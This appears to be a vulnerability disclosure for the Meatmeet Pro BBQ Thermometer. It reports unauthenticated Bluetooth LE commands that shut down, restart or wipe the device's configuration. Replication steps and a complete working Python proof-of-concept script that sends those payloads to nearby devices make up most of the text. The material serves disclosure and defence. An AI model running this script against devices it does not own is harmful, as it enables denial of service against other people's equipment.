### Affected Entity
- Meatmeet Pro BBQ Thermometer v1.0.34.4

### Impact
An unauthenticated attacker within proximity of the Meatmeet device can issue several commands to these devices which would result in a Denial of Service. These commands include: shutdown, restart, clear config. Clear config would disassociate the current device from its user and would require re-configuration to re-enable the device. 
As a result, the end user would be unable to receive updates from the Meatmeet base station which communicates with the cloud services until the device had been fixed or turned back on.  

### Replication Steps
1. Save the MeatConnect Python script locally
2. While in proximity of a Meatmeet Pro base station run the Python script. 
3. Select the device which contains MEBOX01 in the identifer. 
4. Issue the shutdown command by entering: `shutdown`

**Results**

The device is shutdown and no further updates are sent to the cloud, resulting in your delicious meal being burnt (what psycho would ever do such a thing??).

**MeatConnect.py**

```
import asyncio
import json
import time
import locale
from bleak import BleakScanner, BleakClient


SERVICE_UUID = "0000f5a0-0000-1000-8000-00805f9b34fb"
WRITE_CHAR_UUID = "0000f5a1-0000-1000-8000-00805f9b34fb"
NOTIFY_CHAR_UUID = "0000f5a1-0000-1000-8000-00805f9b34fb"


COMMANDS = {
    "restart": {
        "type": "write",
        "uuid": WRITE_CHAR_UUID,
        "payload": bytearray([0x4d, 0x45, 0x0b, 0x00]),
        "description": "Restart the device"
    },
    "remove_config": {
        "type": "write",
        "uuid": WRITE_CHAR_UUID,
        "payload": bytearray([0x4d, 0x45, 0x11, 0x00]),
        "description": "Remove configuration"
    },
    "shutdown": {
        "type": "write",
        "uuid": WRITE_CHAR_UUID,
        "payload": bytearray([0x4d, 0x45, 0x12, 0x00]),
        "description": "Shutdown the device"
    }
}

def handle_prompt_fields(cmd_meta):
    data = {}
    for field in cmd_meta.get("prompt", []):
        val = input(f"{field}: ")
        data[field.lower()] = val
    return data

def build_command(cmd_code, device_id, data=None):
    payload = {
        "c": cmd_code,
        "d": {"device_id": device_id}
    }
    if data:
        payload["d"].update(data)
    return json.dumps(payload).encode()

def notification_handler(sender, data):
    try:
        decoded_data = data.decode(errors='ignore')
        if decoded_data.startswith('c4'):
            print(f"[Notification] Wi-Fi Scan Result: {decoded_data}")
        elif decoded_data.startswith('c2'):
            print(f"[Notification] Wi-Fi Device Node ID: {decoded_data}")
        else:
            print(f"[Notification] From {sender}: {decoded_data}")
    except Exception as e:
        print(f"[Notification Error] Failed to process data: {e}")

async def scan_for_ble():
    print("Scanning for nearby BLE devices (5s)...")
    devices = await BleakScanner.discover(timeout=5.0)

    if not devices:
        print("[-] No devices found.")
        return None

    for i, device in enumerate(devices):
        name = device.name or "Unknown"
        print(f"[{i}] {name} ({device.address})")

    while True:
        try:
            choice = input("Select device to connect (number): ").strip()
            if choice.isdigit():
                index = int(choice)
                if 0 <= index < len(devices):
                    return devices[index].address
            print("Invalid selection. Try again.")
        except KeyboardInterrupt:
            print("\n[-] Aborted.")
            return None

def print_help():
    print("\nAvailable commands:")
    for cmd, meta in sorted(COMMANDS.items()):
        desc = meta.get("description", "No description")
        print(f"  {cmd}: {desc}")
    print("  help: Show this help message")
    print("  exit/quit: Disconnect and exit")
    print("  {raw JSON}: Send raw JSON payload")
    print()

def print_available_characteristics(client):
    print("\n[+] Available GATT Services and Characteristics:")
    for service in client.services:
        print(f"  [Service] {service.uuid}")
        for char in service.characteristics:
            props = ', '.join(char.properties)
            print(f"    └── [Char] {char.uuid} ({props})")
    print()

async def interact_with_device(address):
    async with BleakClient(address) as client:
        print("[*] Connected to", address)

        # Print all available characteristics
        print_available_characteristics(client)

        print("Successfully connected. What would you like to send? (type 'help' for options)")

        while True:
            try:
                user_input = input("> ").strip().lower()
                if not user_input:
                    continue
                if user_input in ("exit", "quit"):
                    break
                if user_input == "help":
                    print_help()
                    continue

                cmd_meta = COMMANDS.get(user_input)
                if not cmd_meta:
                    if user_input.startswith("{"):
                        payload = user_input.encode()
                        await client.write_gatt_char(WRITE_CHAR_UUID, payload)
                        print("[*] Raw JSON command sent.")
                    else:
                        print("[!] Unknown command. Type 'help' to list available commands.")
                    continue

                if cmd_meta.get("type") == "read":
                    value = await client.read_gatt_char(cmd_meta["uuid"])
                    print(f"[<] Read from {cmd_meta['uuid']}: {value.decode(errors='ignore')}")
                    continue

                if "prompt" in cmd_meta:
                    data = handle_prompt_fields(cmd_meta)
                    payload = build_command(user_input, DEVICE_ID, data)
                elif "payload_func" in cmd_meta:
                    payload = cmd_meta["payload_func"]()
                else:
                    payload = cmd_meta["payload"]

                await client.write_gatt_char(cmd_meta["uuid"], payload)
                print("[*] Command sent.")
            except KeyboardInterrupt:
                break
            except Exception as e:
                print("Error:", e)

        # Stop notifications before disconnecting
        try:
            await client.stop_notify(NOTIFY_CHAR_UUID)
            print(f"[*] Notifications stopped on {NOTIFY_CHAR_UUID}")
        except Exception as e:
            print(f"[!] Failed to stop notifications: {e}")
        print("Disconnected.")

async def main():
    address = await scan_for_ble()
    if not address:
        return
    await interact_with_device(address)

if __name__ == "__main__":
    asyncio.run(main())
```
